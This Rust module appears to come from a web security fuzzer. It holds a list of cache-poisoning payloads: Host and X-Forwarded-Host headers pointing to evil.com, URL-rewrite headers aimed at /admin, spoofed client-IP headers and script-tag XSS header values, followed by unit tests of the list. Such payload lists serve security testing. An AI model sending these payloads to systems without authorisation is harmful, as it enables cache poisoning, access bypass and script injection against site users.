use crate::fuzzer::payloads::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    vec![
        Payload {
            payload_type: PayloadType::Cache,
            payload: "X-Forwarded-Host: evil.com".to_string(),
            description: "Cache poisoning - X-Forwarded-Host header".to_string(),
            severity: Severity::High,
            tags: vec!["cache".to_string(), "poisoning".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "X-Forwarded-Scheme: http".to_string(),
            description: "Cache poisoning - X-Forwarded-Scheme".to_string(),
            severity: Severity::High,
            tags: vec!["cache".to_string(), "poisoning".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "X-Forwarded-Proto: http".to_string(),
            description: "Cache poisoning - X-Forwarded-Proto".to_string(),
            severity: Severity::High,
            tags: vec!["cache".to_string(), "poisoning".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "X-Original-URL: /admin".to_string(),
            description: "Cache poisoning - X-Original-URL".to_string(),
            severity: Severity::High,
            tags: vec!["cache".to_string(), "poisoning".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "X-Rewrite-URL: /admin".to_string(),
            description: "Cache poisoning - X-Rewrite-URL".to_string(),
            severity: Severity::High,
            tags: vec!["cache".to_string(), "poisoning".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "Host: evil.com".to_string(),
            description: "Cache poisoning - Host header manipulation".to_string(),
            severity: Severity::High,
            tags: vec!["cache".to_string(), "poisoning".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "X-Host: evil.com".to_string(),
            description: "Cache poisoning - X-Host header".to_string(),
            severity: Severity::High,
            tags: vec!["cache".to_string(), "poisoning".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "X-Forwarded-Server: evil.com".to_string(),
            description: "Cache poisoning - X-Forwarded-Server".to_string(),
            severity: Severity::High,
            tags: vec!["cache".to_string(), "poisoning".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "Cache-Control: no-cache".to_string(),
            description: "Cache poisoning - Cache-Control bypass".to_string(),
            severity: Severity::Medium,
            tags: vec!["cache".to_string(), "bypass".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "Pragma: no-cache".to_string(),
            description: "Cache poisoning - Pragma no-cache".to_string(),
            severity: Severity::Medium,
            tags: vec!["cache".to_string(), "bypass".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "X-Request-ID: evil<script>alert(1)</script>".to_string(),
            description: "Cache poisoning - reflected XSS in header".to_string(),
            severity: Severity::Critical,
            tags: vec!["cache".to_string(), "xss".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "X-Custom-Header: <script>alert(1)</script>".to_string(),
            description: "Cache poisoning - custom header XSS".to_string(),
            severity: Severity::Critical,
            tags: vec!["cache".to_string(), "xss".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "Accept-Encoding: gzip, deflate, fake".to_string(),
            description: "Cache poisoning - encoding variation".to_string(),
            severity: Severity::Medium,
            tags: vec!["cache".to_string(), "encoding".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "Accept-Encoding: gzip, deflate, br".to_string(),
            description: "Cache poisoning - brotli encoding".to_string(),
            severity: Severity::Medium,
            tags: vec!["cache".to_string(), "encoding".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                .to_string(),
            description: "Cache poisoning - user agent variation".to_string(),
            severity: Severity::Medium,
            tags: vec!["cache".to_string(), "user-agent".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "Cookie: session=evil".to_string(),
            description: "Cache poisoning - cookie based".to_string(),
            severity: Severity::High,
            tags: vec!["cache".to_string(), "cookie".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "X-Forwarded-For: 127.0.0.1".to_string(),
            description: "Cache poisoning - X-Forwarded-For".to_string(),
            severity: Severity::Medium,
            tags: vec!["cache".to_string(), "ip".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "Real-IP: 127.0.0.1".to_string(),
            description: "Cache poisoning - Real-IP header".to_string(),
            severity: Severity::Medium,
            tags: vec!["cache".to_string(), "ip".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "X-Real-IP: 127.0.0.1".to_string(),
            description: "Cache poisoning - X-Real-IP header".to_string(),
            severity: Severity::Medium,
            tags: vec!["cache".to_string(), "ip".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "Accept-Language: en-US,en;q=0.9".to_string(),
            description: "Cache poisoning - Accept-Language variation".to_string(),
            severity: Severity::Low,
            tags: vec!["cache".to_string(), "language".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "X-Url-Scheme: http".to_string(),
            description: "Cache poisoning - X-Url-Scheme".to_string(),
            severity: Severity::High,
            tags: vec!["cache".to_string(), "scheme".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "Source-IP: 127.0.0.1".to_string(),
            description: "Cache poisoning - Source-IP header".to_string(),
            severity: Severity::Medium,
            tags: vec!["cache".to_string(), "ip".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "X-Originating-IP: 127.0.0.1".to_string(),
            description: "Cache poisoning - X-Originating-IP".to_string(),
            severity: Severity::Medium,
            tags: vec!["cache".to_string(), "ip".to_string()],
        },
        Payload {
            payload_type: PayloadType::Cache,
            payload: "CF-Connecting-IP: 127.0.0.1".to_string(),
            description: "Cache poisoning - Cloudflare header".to_string(),
            severity: Severity::Medium,
            tags: vec!["cache".to_string(), "cloudflare".to_string()],
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_payloads_returns_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty());
    }

    #[test]
    fn test_get_payloads_count_reasonable() {
        let payloads = get_payloads();
        assert!(payloads.len() > 0);
        assert!(payloads.len() < 10000);
    }

    #[test]
    fn test_payloads_are_non_empty_strings() {
        let payloads = get_payloads();
        for p in &payloads {
            assert!(
                !p.payload.is_empty(),
                "Payload is empty: {:?}",
                p.description
            );
        }
    }

    #[test]
    fn test_payloads_contain_expected_patterns() {
        let payloads = get_payloads();
        let has_xff = payloads
            .iter()
            .any(|p| p.payload.contains("X-Forwarded-Host"));
        let has_xss = payloads.iter().any(|p| p.payload.contains("<script>"));
        let has_cache_control = payloads.iter().any(|p| p.payload.contains("Cache-Control"));
        assert!(has_xff, "Missing X-Forwarded-Host payload");
        assert!(has_xss, "Missing XSS cache poisoning payload");
        assert!(has_cache_control, "Missing Cache-Control payload");
    }
}
